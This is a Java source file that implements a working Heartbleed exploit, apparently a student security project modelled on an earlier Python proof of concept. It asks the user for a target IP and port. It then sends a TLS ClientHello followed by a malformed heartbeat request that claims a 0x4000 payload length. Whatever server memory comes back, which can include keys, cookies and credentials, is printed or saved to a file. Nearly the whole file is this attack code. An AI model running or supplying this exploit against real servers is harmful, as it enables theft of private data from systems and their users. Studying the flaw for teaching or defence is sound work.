import java.io.*;
import java.net.Socket;
import java.util.Scanner;

/**
 * HeartBleed.java
 * @author William Telford
 * @version 1.2
 * A java version of the heartbleed vunlerability attack. 
 * Thank you to Jared Stafford who made the original python POC which was used as inspiration and help in many places.
 * Original python version can be found here: https://gist.github.com/sh1n0b1/10100394
 * Thank you also to Scott Robinson who did a great explaination of the attack here : https://stackabuse.com/how-to-exploit-the-heartbleed-bug/
 * Please see my HeartBleed Project write up for more information.
*/

public class HeartBleed {

    private static String HEARTBLEEDPARAM = "1803020003014000"; //Hex version of a heartbeat request. Content type = 18, version = 03 02 (TLS 1.1),
                                                        // packet length = 00 03, heartbeat message type = 1 (request), payload length = 40 00.

    //Client hello in hex
    private static String CLIENTHELLO = "16030200310100002D0302500BAFBBB75AB83EF0AB9AE3F39C6315334137ACFD6C181A2460DC4967C2FD960000040033C01101000000";

    public static void main(String[] args) throws IOException, InterruptedException {

        //Take users input for ip port and wether or not to create an output file.

        Scanner in = new Scanner(System.in);

        System.out.print("Please Enter a ip address: ");
        String ipAddress = in.nextLine();
        System.out.print("Please Enter a Port Number: ");
        int portNumber = in.nextInt();
        System.out.println("Boolean: would you like to send output to file?");
        boolean hexResponse = in.nextBoolean();

        //open socket with users input

        Socket socket = openSocket(ipAddress, portNumber);

        // Assign output stream

        OutputStream outputStream = null;

        try {

            outputStream = socket.getOutputStream();

        } catch (Exception ex) {

            System.out.println("Could not receive output stream: " + ex.getMessage());
            socket.close();
            System.exit(0);

        }

        // Assign input stream

        InputStream inputStream = null;

        try {

            inputStream = socket.getInputStream();

        } catch (Exception ex) {

            System.out.println("Could not receive input stream: " + ex.getMessage());
            socket.close();
            inputStream.close();
            outputStream.close();
            System.exit(0);

        }

        System.out.println("Connection to server established");

        // Write client hello to output stream and send to server
        // Output must be sent in a byte array format

        byte[] clientHelloInt = hexToByteArray(CLIENTHELLO);

        outputStream.write(clientHelloInt);

        outputStream.flush();

        System.out.println("Client Hello sent");

        // Wait and receive Server Hello

        Thread.sleep(100);

        byte[] serverHello = new byte[50];

        System.out.println("Printing Server Hello: ");

        int i = 0;

        inputStream.read(serverHello);

        while (i < serverHello.length) {

            System.out.print(serverHello[i] + " ");
            i++;

        }

        System.out.println("Server Hello recieved");

        // Once recieved server hello send heartbleed packet

        System.out.println("Sending Heatbleed packet");
        outputStream.write(hexToByteArray(HEARTBLEEDPARAM));
        outputStream.flush();

        Thread.sleep(1000); //wait to recieve heartbleed data.

        byte[] output = new byte[65535];

        while (inputStream.available() > 1 && inputStream.read(output) != -1) {

            if (!hexResponse) {

                System.out.println(new String(output, "UTF-8"));

            } else {

                try {

                    FileWriter myWriter = new FileWriter("HeartbleedOutput.txt");

                    for (int x = 0; x < output.length; x++) {

                        myWriter.write(byteToHex(output[x]) + " ");

                    }

                    myWriter.close();
                    System.out.println("Successfully wrote to the file.");

                } catch (IOException exception) {

                    System.out.println("An error occurred." + exception.getMessage());

                }

            }

        }

        Thread.sleep(3000); //wait till all heartbleed packets are sent

        in.close();
        outputStream.close();
        inputStream.close();

    }

    /**
     * Converts the hex strings to an output stream compatible byte array
     * @param hex
     * @return a byte array containing hex
     */

    private static byte[] hexToByteArray(String hex) {

        byte[] output = new byte[hex.length() / 2];

        for (int x = 0; x < hex.length() / 2; x++) {

            int i = x * 2;
            int j = Integer.parseInt(hex.substring(i, i + 2), 16);
            output[x] = (byte) j;

        }

        return output;

    }

    /**
    * Converts a Byte to hex
    * @param newByte
    * @return a hex version of the byte
    */

    private static String byteToHex(byte newByte) {

        String hex = String.format("%02X", newByte);

        return hex;

    }

    /**
     * Attempts to open a connection to the ip and port specified
     * 
     * @param ipAddress
     * @param portNum
     * @return a open socket connection to the server.
     * @throws IOException
     */

    private static Socket openSocket(String ipAddress, int portNum) throws IOException {

        Socket socket = null;

        try {

            socket = new Socket(ipAddress, portNum);

        } catch (Exception ex) {

            System.out.println("Socket could not connect. Reason: " + ex.getMessage());
            socket.close();
            System.exit(0);

        }

        return socket;

    }

}